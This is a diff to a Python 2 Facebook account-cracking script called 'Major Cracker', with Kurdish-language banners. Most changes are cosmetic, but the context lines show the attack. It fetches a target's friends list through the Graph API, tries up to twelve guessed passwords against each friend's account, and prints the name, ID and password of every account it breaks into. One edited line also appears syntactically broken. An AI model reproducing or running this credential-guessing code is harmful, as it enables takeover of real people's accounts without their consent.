@@ -73,9 +73,6 @@ def anime(z):
 
 logo = """
 
-
-
-
 \033[92m
    '||    ||'     |        '||'  ..|''||   '||''|.   
     |||  |||     |||        ||  .|'    ||   ||   ||  
@@ -257,7 +254,7 @@ def startgrab():
             os.system('clear')
             print logo
             idt = raw_input('[+] ID TARGET  ')
-            print '@@@@@@@@@@@# Major #@@@@@@@@@@@'
+            print '@@@@@@@@@@@@@@@# Major #@@@@@@@@@@@@@@@'
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
@@ -267,7 +264,7 @@ def startgrab():
                 raw_input('[GARANAWA]enter bka')
                 graber()
 
-            print '\033[93m ID W A R G D N '
+            print '\033[93m Ba DasT hEnani ID yakan '
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
             z = json.loads(r.text)
             for i in z['data']:
@@ -287,8 +284,8 @@ def startgrab():
             time.sleep(1)
 
     print '\033[93m Major Cracker '
-    anime('\033[95m Bwasta Bo Dast Pe Krdni Hackaka  ')
-    print '\033[93m ||||||||||||||||||||||||||||||||||||||||||||||| '
+    print('\033[95m Bwasta Bo Dast Pe Krdni Hackaka  ')
+    anime '\033[93m ||||||||||||||||||||||||||||||||||||||||||||||| '
    
     def main(arg):
         user = arg
@@ -306,7 +303,7 @@ def startgrab():
             if 'access_token' in q:
                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                 z = json.loads(x.text)
-                print '\x1b[37;1m HACK BU 100%'
+                print '\x1b[37;1m HACK BU 1000000%'
                 print '\x1b[37;1mNAWE >>> ' + b['name']
                 print '\x1b[37;1mID kay >>>' + user
                 print '\x1b[37;1mPASSWORD kay >>>' + pass1 + '\n'
@@ -327,7 +324,7 @@ def startgrab():
                 if 'access_token' in q:
                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                     z = json.loads(x.text)
-                    print '\x1b[37;1m HACK BU 100%'
+                    print '\x1b[37;1m HACK BU 1000000%'
                     print '\x1b[37;1mNAWE >>> ' + b['name']
                     print '\x1b[37;1mID kay >>>' + user
                     print '\x1b[37;1mPASSWORD kay >>>' + pass2 + '\n'
@@ -348,7 +345,7 @@ def startgrab():
                     if 'access_token' in q:
                         x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                         z = json.loads(x.text)
-                        print '\x1b[37;1m HACK BU 100%'
+                        print '\x1b[37;1m HACK BU 1000000%'
                         print '\x1b[37;1mNAWE >>> ' + b['name']
                         print '\x1b[37;1mID kay >>>' + user
                         print '\x1b[37;1mPASSWORD kay >>>' + pass3 + '\n'
@@ -369,7 +366,7 @@ def startgrab():
                         if 'access_token' in q:
                             x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                             z = json.loads(x.text)
-                            print '\x1b[37;1m HACK BU 100%'
+                            print '\x1b[37;1m HACK BU 1000000%'
                             print '\x1b[37;1mNAWE >>> ' + b['name']
                             print '\x1b[37;1mID kay >>>' + user
                             print '\x1b[37;1mPASSWORD kay >>>' + pass4 + '\n'
@@ -390,7 +387,7 @@ def startgrab():
                             if 'access_token' in q:
                                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                 z = json.loads(x.text)
-                                print '\x1b[37;1m HACK BU 100%'
+                                print '\x1b[37;1m HACK BU 1000000%'
                                 print '\x1b[37;1mNAWE >>> ' + b['name']
                                 print '\x1b[37;1mID kay >>>' + user
                                 print '\x1b[37;1mPASSWORD kay >>>' + pass5 + '\n'
@@ -411,7 +408,7 @@ def startgrab():
                                 if 'access_token' in q:
                                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                     z = json.loads(x.text)
-                                    print '\x1b[37;1m HACK BU 100%'
+                                    print '\x1b[37;1m HACK BU 1000000%'
                                     print '\x1b[37;1mNAWE >>> ' + b['name']
                                     print '\x1b[37;1mID kay >>>' + user
                                     print '\x1b[37;1mPASSWORD kay >>>' + pass6 + '\n'
@@ -432,7 +429,7 @@ def startgrab():
                                     if 'access_token' in q:
                                         x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                         z = json.loads(x.text)
-                                        print '\x1b[37;1m HACK BU 100%'
+                                        print '\x1b[37;1m HACK BU 1000000%'
                                         print '\x1b[37;1mNAWE >>> ' + b['name']
                                         print '\x1b[37;1mID kay >>>' + user
                                         print '\x1b[37;1mPASSWORD kay >>>' + pass7 + '\n'
@@ -453,7 +450,7 @@ def startgrab():
                                         if 'access_token' in q:
                                             x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                             z = json.loads(x.text)
-                                            print '\x1b[37;1m HACK BU 100%'
+                                            print '\x1b[37;1m HACK BU 1000000%'
                                             print '\x1b[37;1mNAWE >>> ' + b['name']
                                             print '\x1b[37;1mID kay >>>' + user
                                             print '\x1b[37;1mPASSWORD kay >>>' + pass8 + '\n'
@@ -474,7 +471,7 @@ def startgrab():
                                             if 'access_token' in q:
                                                 x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                 z = json.loads(x.text)
-                                                print '\x1b[37;1m HACK BU 100%'
+                                                print '\x1b[37;1m HACK BU 1000000%'
                                                 print '\x1b[37;1mNAWE >>> ' + b['name']
                                                 print '\x1b[37;1mID kay >>>' + user
                                                 print '\x1b[37;1mPASSWORD kay >>>' + pass9 + '\n'
@@ -495,7 +492,7 @@ def startgrab():
                                                   if 'access_token' in q:
                                                     x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                     z = json.loads(x.text)
-                                                    print '\x1b[37;1m HACK BU 100%'
+                                                    print '\x1b[37;1m HACK BU 1000000%'
                                                     print '\x1b[37;1mNAWE >>> ' + b['name']
                                                     print '\x1b[37;1mID kay >>>' + user
                                                     print '\x1b[37;1mPASSWORD kay >>>' + pass10 + '\n'
@@ -516,7 +513,7 @@ def startgrab():
                                                        if 'access_token' in q:
                                                           x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                           z = json.loads(x.text)
-                                                          print '\x1b[37;1m HACK BU 100%'
+                                                          print '\x1b[37;1m HACK BU 1000000%'
                                                           print '\x1b[37;1mNAWE >>> ' + b['name']
                                                           print '\x1b[37;1mID kay >>>' + user
                                                           print '\x1b[37;1mPASSWORD kay >>>' + pass11 + '\n'
@@ -537,7 +534,7 @@ def startgrab():
                                                            if 'access_token' in q:
                                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                                z = json.loads(x.text)
-                                                               print '\x1b[37;1m HACK BU 100%'
+                                                               print '\x1b[37;1m HACK BU 1000000%'
                                                                print '\x1b[37;1mNAWE >>> ' + b['name']
                                                                print '\x1b[37;1mID kay >>>' + user
                                                                print '\x1b[37;1mPASSWORD kay >>>' + pass12 + '\n'
